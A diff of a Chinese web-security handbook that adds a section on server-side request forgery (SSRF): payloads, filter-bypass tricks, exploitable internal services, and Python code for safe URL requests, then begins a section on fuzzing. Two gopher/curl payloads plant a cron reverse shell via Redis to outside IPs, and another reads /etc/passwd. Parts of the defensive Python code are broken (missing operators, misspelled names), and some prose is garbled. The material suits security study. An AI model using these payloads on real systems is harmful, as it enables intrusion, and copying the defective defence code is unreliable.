@@ -3521,7 +3521,7 @@ Python反弹shell
 > 
 > 简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制(copy-on-write，COW)时产生了竞争条件(race conditio)，恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问，竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限
 
-## 0x02 服务器端应用安全
+## <font color="yellow">0x02 服务器端应用安全</font>
 
 ### <font color="yellow">01 注入攻击</font>
 
@@ -7317,18 +7317,1422 @@ Luca、Carettoni等人演示了这种被称为HPP的攻击，简单来说，就�
 
 ### <font color="yellow">10 服务器端请求伪造(SSRF)</font>
 
+#### <font color="yellow">001 简介</font>
 
+服务端请求伪造(Server Side Request Forgery,SSRF)指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网，SSRF攻击通常针对外部网络无法直接访问的内部系统
 
+漏洞危害
 
+> SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件，内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害
 
+#### <font color="yellow">002 利用方式</font>
 
+SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式，以curl为例，可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下
 
+- `curl -vvv 'dict://127.0.0.1:6379/info'`
+- `curl -vvv 'file:///etc/passwd'`
+- `curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'`
+                
+#### <font color="yellow">003 相关危险函数</font>
 
+SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取，以PHP为例，涉及到的函数有
 
+- file_get_contents()
+- fsockopen()
+- curl_exec()
 
+#### <font color="yellow">004 过滤绕过</font>
 
+##### <font color="yellow">0001 更改IP地址写法</font>
 
+一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式
 
+- `^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$`
+- `^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
+- `^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$`
+
+对于这种过滤我们采用改编IP的写法的方式进行绕过
+
+例如`192.168.0.1`这个IP地址可以被改写成
+
+- 8进制格式
+
+    `0300.0250.0.1`
+
+- 16进制格式
+
+    `0xC0.0xA8.0.1`
+
+- 10进制整数格式
+
+    `3232235521`
+
+- 16进制整数格式
+
+    `0xC0A80001`
+
+- 合并后两位
+
+    `1.1.278`
+
+    `1.1.755`
+
+- 合并后三位
+
+    `1.278`
+
+    `1.755`
+
+    `3.14159267`
+
+另外IP中的每一位，各个进制可以混用，访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作，另外，`0.0.0.0`这个IP可以直接访问到本地，也通常被正则过滤遗漏
+
+##### <font color="yellow">0002 使用解析到内网到域名</font>
+
+如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名，另外`xip.io`提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如`192.168.0.1.xip.io`，解析到`192.168.0.1`
+    
+##### <font color="yellow">0003 利用解析URL所出现的问题</font>
+
+某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤，这时候可能会出现对URL参数解析不当，导致可以绕过过滤，比如`http://www.baidu.com@192.168.0.1/`当后端程序通过不正确的正则表达式(比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时)对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是`192.168.0.1`上的内容
+    
+##### <font color="yellow">0004 利用跳转</font>
+
+如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过，可以使用如`http://httpbin.org/redirect-to?url=http://192.168.0.1`等服务跳转，但是由于URL中包含了`192.168.0.1`这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过，常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会
+    
+##### <font color="yellow">0005 通过各种非HTTP协议</font>
+
+如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用，比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的，例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL
+
+`gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i >& /dev/tcp/172.19.23.228/23330>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a`
+
+除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似`file:///path/to/file`这种格式来访问计算机本地文件，使用file协议可以避免服务端程序对于所访问的IP进行的过滤例如我们可以通过`file:///d:/1.txt`来访问D盘中`1.txt`的内容
+    
+##### <font color="yellow">0006 DNS Rebinding</font>
+
+一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求
+
+但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击，要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0
+
+这样就可以进行攻击了，完整的攻击流程为
+
+- 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
+- 对于获得的IP进行判断，发现为非黑名单IP，则通过验证
+- 服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址
+- 由于已经绕过验证，所以服务器端返回访问内网资源的结果
+    
+##### <font color="yellow">0007 利用IPv6</font>
+
+有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如`[::] 0000::1`或IPv6的内网域名来绕过过滤
+    
+##### <font color="yellow">0008 利用IDN</font>
+
+一些网络访问工具如Curl等是支持国际化域名(Internationalized Domain Name,IDN)的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，在这些字符中，部分字符会在访问时做一个等价转换，例如`ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`和`example.com`等同，利用这种方式，可以用`①` `②` `③` `④` `⑤` `⑥` `⑦` `⑧` `⑨` `⑩`等字符绕过内网限制
+
+#### <font color="yellow">005 可能的利用点</font>
+
+##### <font color="yellow">0001 内网服务</font>
+
+- Apache Hadoop远程命令执行
+- axis2-admin部署Server命令执行
+- Confluence SSRF
+- counchdb WEB API远程命令执行
+- dict
+- docker API远程命令执行
+- Elasticsearch引擎Groovy脚本命令执行
+- ftp / ftps（FTP爆破）
+- glassfish任意文件读取和war文件部署间接命令执行
+- gopher
+- HFS远程命令执行
+- http、https
+- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）
+- Java调试接口命令执行
+- JBOSS远程Invoker war命令执行
+- Jenkins Scripts接口命令执行
+- ldap
+- mongodb
+- php_fpm/fastcgi 命令执行
+- rtsp - smb/smbs（连接SMB）
+- sftp
+- ShellShock 命令执行
+- Struts2 命令执行
+- telnet
+- tftp（UDP协议扩展）
+- tomcat命令执行
+- WebDav PUT上传任意文件
+- WebSphere Admin可部署war间接命令执行
+- zentoPMS远程命令执行
+
+##### <font color="yellow">0002 Redis利用</font>
+
+- 写ssh公钥
+- 写crontab
+- 写WebShell
+- Windows写启动项
+- 主从复制加载`.so`文件
+- 主从复制写无损文件
+
+##### <font color="yellow">0003 云主机</font>
+
+在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果
+
+##### <font color="yellow">0004 防御方式</font>
+
+- 过滤返回的信息
+- 统一错误信息
+- 限制请求的端口
+- 禁止不常用的协议
+- 对DNS Rebinding，考虑使用DNS缓存或者Host白名单
+
+##### <font color="yellow">0005 如何在Python开发中拒绝SSRF漏洞</font>
+
+###### <font color="yellow">a. SSRF漏洞常见防御及绕过方法</font>
+
+SSRF是一种常见的Web漏洞，于需要请求外部内容的逻辑存在中，比如本地化网络图片、XML解析时的外部实体注入、软件的离线下载等，URL，提供代码直接请求这个URL，将造成SSRF漏洞
+
+具体表现在以下几个财团上
+
+- URL为内网IP或域名，攻击者可以通过SSRF漏洞扫描目标内网，并寻找内网内的漏洞，想办法快速瞄准
+- URL中包含端口，攻击者可以扫描并发现内网中的其他服务，再进一步进行利用
+- 当请求方法允许其他协议的时候，将可能使用gophar、file等协议进行服务利用，如利用内网的redis获取权限、利用fastcgi进行getshell等
+
+特别是这些年，大量利用SSRF攻击网服务的案例被爆出来，导致SSRF漏洞逐渐出现，这给Web应用开发者提出了一个难题：如何在保证业务正常的情况下防御SSRF漏洞？很多开发者认为，只要检查一下请求url的host不为内网IP
+
+这个观点提出了两个技术要点
+
+- 如何检查IP是否为内网IP
+- 如何获取真正请求的主机
+
+于是，通过这两个技术小窍门，想办法解决很多方法
+
+###### <font color="yellow">b. 如何检查IP是否为内网IP</font>
+
+这实际上是很多开发者提出的第一个问题，很多问题甚至连内网IP经常的段数也很多，何谓内网IP，实际上并没有一个硬性的规定，到多少段必须设置为内网的例子，通常我们为内网以下三个段设置为内网，所有内网内的机器分配到的IP在这些段中
+
+`192.168.0.0/16` => `192.168.0.0` ~ `192.168.255.255`
+`10.0.0.0/8` => `10.0.0.0` ~ `10.255.255.255`
+`172.16.0.0/12` => `172.16.0.0` ~ `172.31.255.255`
+
+所以，通常情况下，我们只需要判断目标IP不在这三个段，另外还包括`127.0.0.0/8`和`0.0.0.0/8`，在Linux下，`127.0.0.1`与`0.0.0.0`都本地本地，参考[http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)，很多人会忘记`127.0.0.0/8`，认为本地地址就是`127.0.0.1`，实际上本地回环包括了整个127段，你可以访问`http://127.233.233.233/`，会发现和请求`127.0.0.1`是一个结果，所以我们需要防御的实际上是5个段，只要IP不免这5个段中，就认为是“安全”的，网上一些开发者会选择使用“正则”的方式判断目标IP是否在这几个段中，这种判断方法是会遗漏还是误判
+
+比如
+
+```python
+if re.match(r"^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$",ip_addess) or \
+    re.match(r"^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$",ip_addess) or \
+        re.match(r"^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$",ip_addess):
+    raise BaseException("inner ip addess attack")
+```
+
+这是Sec-News最新版本判断内网IP的方法，里面使用正则判断IP是否时间网的几个段中
+
+问题
+
+- 利用八进制IP地址绕过
+- 利用十六进制IP地址绕过
+- 利用十进制的IP地址绕过
+- 利用IP地址的省略写法绕过
+
+写法(5个例子)：`012.0.0.1`、`0xa.0.0.1`、`167772161`、`10.1`、`0xA000001`但都请求请求是`10.0.0.1`，他们一个都匹配不上正则表达式，更聪明的人是不会用正则表达式来检测IP的(这种人并不多见于内网的正则一则特定规范写)，Wordpress的做法，先将IP地址化，然后`。`将其分割成数组parts，然后根据`parts[0]`和`parts[1]`的取值来判断
+
+```php
+if(! $same_host) {
+    $host = trim($parsed_url['host'],'.');
+    if(preg_match('#^(([1-9]?\d|1\d\d|25[0-5]|2[0-4]\d){3}[1-9]?\d|1\d\d|25[0-5]|2[0-4]\d)$#',$host)) {
+        $ip = $host;
+    }
+    else {
+        $ip = gethostbyname($host);
+        if($ip === $host) // Error condition for gethostbyname()
+            $ip = false;
+    }
+    if($ip) {
+        $parts = array_map('intval',explode('.',$ip));
+        if(127 === $parts[0]|| 10 === $parts[0] || 0 === $parts[0] || (172 === $parts[0] && 16<= $parts[1] && 31 >= $parts[1]) || (192 === $parts[0] && 168 === $parts[1])
+        ) {
+            // If host appears local,reject unless specifically allowed
+            /*
+                * Check if HTTP request is external or not
+
+                * Allows to change and allow external requests for the HTTP request
+
+                * @since 3.6.0
+
+                * @param bool false Whether HTTP request is external or not
+                * @param string $host IP of the requested host
+                * @param string $url URL of the requested host
+            */
+            if(! apply_filters('http_request_host_is_external',false,$host,$url)) {
+                return false;
+            }
+        }
+    }
+}
+```
+
+其实也略显麻烦，而且曾经也出现过用过方法的案例(WordPress<4.5SSRF分析)，不推荐使用，[http://xlab.baidu.com/wordpress/](http://xlab.baidu.com/wordpress/)，我又选择了一种更简单的方法，转换IP地址是可以转换成一个转换的，在PHP中调用`ip2long`函数转换，在Python使用`inet_aton`去转换，那么IP地址是一一对应的，和`0.0.0.0 == 0，255.255.255.255 == 2^32 - 1`，所以，我们判断一个IP是否在某个IP段内，最将IP段的话题值、目标IP值全部转换为可能，然后比较大小，于是，我们可以将之前的正则匹配的方法修改为如下方法
+
+```php
+if ip2long("10.0.0.0") <= ip_long <= ip_long("10.255.255.255") or \
+    ip2long("172.16.0.0") <= ip_long <= ip_long("172.31.255.255") or \
+    ip2long("192.168.0.0") <= ip_long <= ip_long("192.168.255.255") or \
+    ip2long("127.0.0.0") <= ip_long <= ip_long("127.255.255.255"):
+    raise BaseException("inner ip address attack")
+```
+
+这就是一个最简单的方法，也最容易理解，偷看你知道一点掩码的知识，你知道IP地址的掩码实际上就是这样(32-IP地址所代表的数字的末尾bit数)，将以上判断修改地更简单
+
+```python
+from socket import inet_aton
+from struct import unpack
+
+def ip2long(ip_addr):
+    return unpack("!L", inet_aton(ip_addr))[0]
+
+def is_inner_ipaddress(ip):
+    ip = ip2long(ip)
+    return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
+        ip2long('10.0.0.0') >> 24 == ip >> 24 or \
+        ip2long('172.16.0.0') >> 20 == ip >> 20 or \
+        ip2long('192.168.0.0') >> 16 == ip >> 16 \
+        ip2long('0.0.0.0') >> 24 == ip >> 24
+```
+
+以上代码也就是Python中判断一个IP是否是内网IP的最终方法，使用时调用`is_inner_ipaddress(...)`即可(注意自己编写捕捉异常的代码)
+
+###### <font color="yellow">c. host获取与绕过</font>
+
+如何获取"真正请求"的Host，这里需要考虑三个问题
+
+- 如何正确的获取用户输入的URL的Host？
+- 只要Host只要不是内网IP即可吗？
+- 只要Host指向的IP不是内网IP即可吗？
+
+1. 第一个问题
+
+> 看起来很简单，但实际上有很多网站在获取Host上犯过一些错误，最常见的就是，使用`http://233.233.233.233@10.0.0.1:8080/`、`http://10.0.0.1#233.233.233.233`这样的URL，让后端认为其Host是`233.233.233.233`，实际上请求的却是`10.0.0.1，这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL
+> 
+> 在Python 3下，正确获取一个URL的Host的方法
+> 
+> ```python
+> from urllib.parse import urlparse
+> 
+> url = 'https://10.0.0.1/index.php'
+> urlparse(url).hostname
+> ```
+> 
+> 这一步一定不能犯错，否则后面的工作就白做了
+
+2. 第二个问题
+
+> 只要检查一下我们获取到的Host是否是内网IP，即可防御SSRF漏洞么？答案是否定的，原因是，Host可能是IP形式，也可能是域名形式，如果Host是域名形式，我们是没法直接比对的，只要其解析到内网IP上，就可以绕过我们的`is_inner_ipaddress`了，网上有个服务`http://xip.io`，这是一个“神奇”的域名，它会自动将包含某个IP地址的子域名解析到该IP，比如`127.0.0.1.xip.io`，将会自动解析到`127.0.0.1`，`www.10.0.0.1.xip.io`将会解析到`10.0.0.1`，这个域名极大的方便了我们进行SSRF漏洞的测试，当我们请求`http://127.0.0.1.xip.io/info.php`的时候，表面上请求的Host是`127.0.0.1.xip.io`，此时执行`is_inner_ipaddress`(`'127.0.0.1.xip.io'`)是不会返回True的，但实际上请求的却是`127.0.0.1`，这是一个标准的内网IP，所以，在检查Host的时候，我们需要将Host解析为具体IP，再进行判断，代码如下
+> 
+> ```python
+> import socket
+> import re
+> from urllib.parse import urlparse
+> from socket import inet_aton
+> from struct import unpack
+> 
+> def check_ssrf(url):
+>     hostname = urlparse(url).hostname
+> 
+>     def ip2long(ip_addr):
+>         return unpack("!L", inet_aton(ip_addr))[0]
+> 
+>     def is_inner_ipaddress(ip):
+>         ip = ip2long(ip)
+>         return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
+>                 ip2long('10.0.0.0') >> 24 == ip >> 24 or \
+>                 ip2long('172.16.0.0') >> 20 == ip >> 20 or \
+>                 ip2long('192.168.0.0') >> 16 == ip >> 16 \
+>                 ip2long('0.0.0.0') >> 24 == ip >> 24
+> 
+>     try:
+>         if not re.match(r"^https?://.*/.*$", url):
+>             raise BaseException("url format error")
+>         ip_address = socket.getaddrinfo(hostname, 'http')[0][4][0]
+>         if is_inner_ipaddress(ip_address):
+>             raise BaseException("inner ip address attack")
+>         return True, "success"
+>     except BaseException as e:
+>         return False, str(e)
+>     except:
+>         return False, "unknow error"
+> ```
+> 
+> 首先判断url是否是一个HTTP协议的URL(如果不检查，攻击者可能会利用file、gophar等协议进行攻击)，然后获取url的host，并解析该host，最终将解析完成的IP放入`is_inner_ipaddress`函数中检查是否是内网IP
+
+3. 第三个问题
+
+> 是不是做了以上工作，解析并判断了Host指向的IP不是内网IP，即防御了SSRF漏洞？，答案继续是否定的，上述函数并不能正确防御SSRF漏洞，当我们请求的目标返回30X状态的时候，如果没有禁止跳转的设置，大部分HTTP库会自动跟进跳转，此时如果跳转的地址是内网地址，将会造成SSRF漏洞，这个原因也很好理解，我以Python的requests库为例，requests的API中有个设置，叫`allow_redirects`，当将其设置为True的时候requests会自动进行30X跳转，而默认情况下(开发者未传入这个参数的情况下)，requests会默认将其设置为True
+> 
+> ```python
+> def get(url,params = None,**kwargs):
+>     '''Sends a GET request
+>         :param url : URL for the new :class:'Request' object
+>         :param params : (optional) Dictionary or bytes to be sent in the query string for the :class:'Request'
+>         :param \*\*kwargs : Optional argunents that ''request'' takes
+>         :return : :class:'Response <Response>' object
+>         :rtype : requests.Response
+>     '''
+>     kwargs.setdefault('allow_redirects',True)
+>     return request('get',url,params-params=params,**kvargs)
+> ```
+> 
+> 所以，我们可以试试请求一个302跳转的网址，默认情况下，将会跟踪location指向的地址，所以返回的status code是最终访问的页面的状态码，而设置了`allow_redirects`的情况下，将会直接返回302状态码，所以，即使我们获取了`http://t.cn/R2iwH6d`的Host，通过了`is_inner_ipaddress`检查，也会因为302跳转，跳到一个内网IP，导致SSRF
+> 
+> 这种情况下，我们有两种解决方法
+> 
+> - 设置`allow_redirects=False`，不允许目标进行跳转
+> - 每跳转一次，就检查一次新的Host是否是内网IP，直到抵达最后的网址
+> 
+> 第一种情况明显是会影响业务的，只是规避问题而未解决问题，当业务上需要目标URL能够跳转的情况下，只能使用第二种方法了，所以，归纳一下，完美解决SSRF漏洞的过程如下
+> 
+> - 解析目标URL，获取其Host
+> - 解析Host，获取Host指向的IP地址
+> - 检查IP地址是否为内网IP
+> - 请求URL
+> - 如果有跳转，拿出跳转URL，执行1
+
+###### <font color="yellow">d. 使用requesrs库的hooks属性来检查SSRF</font>
+
+那么，上一章说的5个过程，具体用Python怎么实现？我们可以写一个循环，循环条件就是“该次请求的状态码是否是30X”，如果是就继续执行循环，继续跟进location，如果不是，则退出循环
+
+代码如下
+
+```python
+r = requests.get(url, allow_redirects=False)
+while r.is_redirect:
+    url = r.headers['location']
+    succ, errstr = check_ssrf(url)
+    if not succ:
+        raise Exception('SSRF Attack.')
+    r = requests.get(url, allow_redirects=False)
+```
+
+这个代码思路大概没有问题，但非常简陋，而且效率不高，只要你翻翻requests的源代码，你会发现，它在处理30X跳转的时候考虑了很多地方
+
+- 所有请求放在一个`requests.Session()`中
+- 跳转有个缓存，当下次跳转地址在缓存中的时候，就不用多次请求了
+- 跳转数量有最大限制，不可能无穷无尽跳下去
+- 解决307跳转出现的一些BUG等
+
+如果说就按照之前简陋的代码编写程序，固然可以防御SSRF漏洞，但上述提高效率的方法均没用到，那么，有更好的解决方法么？当然有，我们翻一下requests的源代码，可以看到一行特殊的代码
+
+```python
+r = dispath_hook('response',hooks,r,**kargs)
+```
+
+hook的意思就是“劫持”，意思就是在hook的位置我可以插入我自己的代码，我们看看`dispatch_hook`函数做了什么
+
+```python
+def dispatch_hook(key, hooks, hook_data, **kwargs):
+    """Dispatches a hook dictionary on a given piece of data."""
+    hooks = hooks or dict()
+    hooks = hooks.get(key)
+    if hooks:
+        if hasattr(hooks, '__call__'):
+            hooks = [hooks]
+        for hook in hooks:
+            _hook_data = hook(hook_data, **kwargs)
+            if _hook_data is not None:
+                hook_data = _hook_data
+    return hook_data
+```
+
+`hooks`是一个函数，或者一系列函数，这里做的工作就是遍历这些函数，并调用：`_hook_data = hook(hook_data, **kwargs)`，我们翻翻文档，可以找到hooks event的说明[http://docs.python-requests.org/en/master/user/advanced/?highlight=hook#event-hooks](http://docs.python-requests.org/en/master/user/advanced/?highlight=hook#event-hooks)，文档中定义了一个`print_url`函数，将其作为一个`hook`函数，在请求的过程中，响应对象被传入了`print_url`函数，请求的域名被打印了下来，我们可以考虑一下，我们将检查SSRF的过程也写为一个`hook`函数，然后传给`requests.get`，在之后的请求中一旦获取response就会调用我们的`hook`函数，这样，即使我设置`allow_redirects=True`，requests在每次请求后都会调用一次`hook`函数，在hook函数里我只需检查一下`response.headers['location']`即可，说干就干，先写一个`hook`函数
+
+```python
+def _request_check_location(r,*args,**kwargs):
+    if not r.is_redirect:
+        return
+    url = r.headers['location']
+
+    # The scheme should be lower case...
+    passed = urlparse(url)
+    url = parsed.geturl()
+
+    '''
+        Faciliate relative 'location' headers,as allowed by RFC 7231
+        (e.g. '/path/to/resource' instead of 'http://doamin.tid/path/to/resource')
+        Compliant with RFC3986,we percent encode the url
+    '''
+    if not passed.netloc:
+        url = urljoin(r.url,requote_uri(url))
+    else:
+        url = requote_uri(url)
+    
+    succ,errstr = check_ssrf(url)
+    if not succ:
+        raise requests,exeptions.InvalidURL("SSRF Attack: %s" % (errstr,))
+```
+
+当`r.is_redirect`为`True`的时候，也就是说这次请求包含一个跳转，获取此时的`r.headers['location']`，并进行一些处理，最后传入`check_ssrf`，当检查不通过时，抛出一个异常，然后编写一个请求函数`safe_request_url`，意思是“安全地请求一个URL”，使用这个函数请求的域名，将不会出现SSRF漏洞
+
+```python
+def safe_request_url(url,**kawrgs):
+    def _request_check_location(r,*args,**kwargs):
+        if not r.is_redirect:
+            return
+        url = r.headers['location']
+
+        # The scheme should be lower case...
+        passed = urlparse(url)
+        url = parsed.geturl()
+
+        '''
+            Faciliate relative 'location' headers,as allowed by RFC 7231
+            (e.g. '/path/to/resource' instead of 'http://doamin.tid/path/to/resource')
+            Compliant with RFC3986,we percent encode the url
+        '''
+        if not passed.netloc:
+            url = urljoin(r.url,requote_uri(url))
+        else:
+            url = requote_uri(url)
+        
+        succ,errstr = check_ssrf(url)
+        if not succ:
+            raise requests,exeptions.InvalidURL("SSRF Attack: %s" % (errstr,))
+    
+    success,errstr = check_ssrf(url)
+    if not success:
+        raise requests.exception.InvalidURL("SSRF Attack: %s" % (errstr,))
+    
+    hooks = dict(response = _requset_check_location)
+    kawrgs['hooks'] = hooks
+    return requests.get(url,**kwargs)
+```
+
+我们可以看到，在第一次请求url前，还是需要`check_ssrf`一次的，因为`hook`函数`_request_check_location`只是检查30X跳转时是否存在SSRF漏洞，而没有检查最初请求是否存在SSRF漏洞，不过上面的代码还不算完善，因为`_request_check_location`覆盖了原有(用户可能定义的其他`hooks`)的`hooks`属性，所以需要简单调整一下，最终，给出完整代码
+
+```python
+import socket
+import re
+import requests
+from urllib.parse import urlparse
+from socket import inet_aton
+from struct import unpack
+from requests.utils import requote_uri
+
+def check_ssrf(url):
+    hostname = urlparse(url).hostname
+
+    def ip2long(ip_addr):
+        return unpack("!L", inet_aton(ip_addr))[0]
+
+    def is_inner_ipaddress(ip):
+        ip = ip2long(ip)
+        return ip2long('127.0.0.0') >> 24 == ip >> 24 or \
+                ip2long('10.0.0.0') >> 24 == ip >> 24 or \
+                ip2long('172.16.0.0') >> 20 == ip >> 20 or \
+                ip2long('192.168.0.0') >> 16 == ip >> 16 \
+                ip2long('0.0.0.0') >> 24 == ip >> 24
+
+    try:
+        if not re.match(r"^https?://.*/.*$", url):
+            raise BaseException("url format error")
+        ip_address = socket.getaddrinfo(hostname, 'http')[0][4][0]
+        if is_inner_ipaddress(ip_address):
+            raise BaseException("inner ip address attack")
+        return True, "success"
+    except BaseException as e:
+        return False, str(e)
+    except:
+        return False, "unknow error"
+
+def safe_request_url(url, **kwargs):
+    def _request_check_location(r, *args, **kwargs):
+        if not r.is_redirect:
+            return
+        url = r.headers['location']
+
+        # The scheme should be lower case...
+        parsed = urlparse(url)
+        url = parsed.geturl()
+
+        # Facilitate relative 'location' headers, as allowed by RFC 7231.
+        # (e.g. '/path/to/resource' instead of 'http://domain.tld/path/to/resource')
+        # Compliant with RFC3986, we percent encode the url.
+        if not parsed.netloc:
+            url = urljoin(r.url, requote_uri(url))
+        else:
+            url = requote_uri(url)
+
+        succ, errstr = check_ssrf(url)
+        if not succ:
+            raise requests.exceptions.InvalidURL("SSRF Attack: %s" % (errstr, ))
+
+    success, errstr = check_ssrf(url)
+    if not success:
+        raise requests.exceptions.InvalidURL("SSRF Attack: %s" % (errstr,))
+
+    all_hooks = kwargs.get('hooks', dict())
+    if 'response' in all_hooks:
+        if hasattr(all_hooks['response'], '__call__'):
+            r_hooks = [all_hooks['response']]
+        else:
+            r_hooks = all_hooks['response']
+
+        r_hooks.append(_request_check_location)
+    else:
+        r_hooks = [_request_check_location]
+
+    all_hooks['response'] = r_hooks
+    kwargs['hooks'] = all_hooks
+    return requests.get(url, **kwargs)
+```
+
+外部程序只要调用`safe_request_url(url)`即可安全地请求某个URL，该函数的参数与`requests.get`函数参数相同，完美在Python Web开发中解决SSRF漏洞，其他语言的解决方案类似，大家可以自己去探索
+
+## <font color="yellow">0x03 其他Web安全</font>
+
+### <font color="yellow">01 FUZZ模糊测试</font>
+
+#### <font color="yellow">001 简介</font>
+
+模糊测试是一种自动或半自动的测试技术，常被用来发现软件/操作系统/网络的代码中的错误和安全性问题，其中用于输入随机的数据和不合法的数据被称为FUZZ，之后，系统将被监视各种异常，如系统崩溃或内置代码失败等，模糊测试最初是由威斯康辛大学的巴顿·米勒于1989年开发的，模糊测试是一种软件测试技术，是安全测试的一种
+
+#### <font color="yellow">002 原因</font>
+
+- 通常，模糊测试会发现最严重的的安全错误或缺陷
+- 当与黑箱测试、Beta测试和其他调试方法一起使用时，Fuzz测试会产生更有效的结果
+- 模糊测试用于检测软件的脆弱性，这是一种非常经济有效的测试技术
+- 模糊测试是黑盒测试技术之一，模糊是黑客发现系统漏洞最常用的方法之一
+
+#### <font color="yellow">003 步骤</font>
+
+- 识别目标系统
+- 确定输入
+- 生成模糊数据
+- 使用模糊数据执行测试
+- 监控系统的行为
+- 记录缺陷
+
+#### <font color="yellow">004 举例</font>
+
+- Mutation-Based Fuzzers：alter existing data samples to create new test data, This is the very simple and straightforward approach, this starts with valid samples of protocol and keeps mangling every byte or file
+- Generation-Based Fuzzers：define new data based on the input of the model, It starts generating input from the scratch based on the specification
+- PROTOCOL-BASED-fuzzer
+
+	最成功的fuzzer是对正在测试的协议格式有详细的了解，理解取决于规范，它包括在工具中编写一个规范数组，然后使用基于模型的测试生成技术遍历规范并在数据内容、序列等中添加不规则性，这也称为语法测试、语法测试、健壮性测试等，Fuzzer可以从现有的测试用例生成测试用例，也可以使用有效或无效的输入
+
+主要包含3中不同类型的fuzzer，基于交叉、生成和协议的，由于部分翻译起来比较生硬，还是英文对比起来比较直观，所以就不翻译了
+
+protocol-based fuzzing的两个限制
+
+- 在规范成熟之前不能进行测试
+- 许多有用的协议都是已发布协议的扩展，如果fuzz测试基于已发布的规范，则新协议的测试覆盖率将受到限制
+
+模糊技术最简单的形式是将随机输入作为协议包或事件发送给软件，这种传递随机输入的技术对于发现许多应用程序和服务中的错误非常有用，其他技术也是可用的，并且很容易实现，要实现这些技术，我们只需要更改现有的输入，我们可以通过交换输入的位来改变输入
+
+#### <font color="yellow">005 通过模糊测试检测到的bug类型</font>
+
+- Assertion failures and memory leaks：this methodology is widely used for large applications where bugs are affecting the safety of memory, which is a severe vulnerability
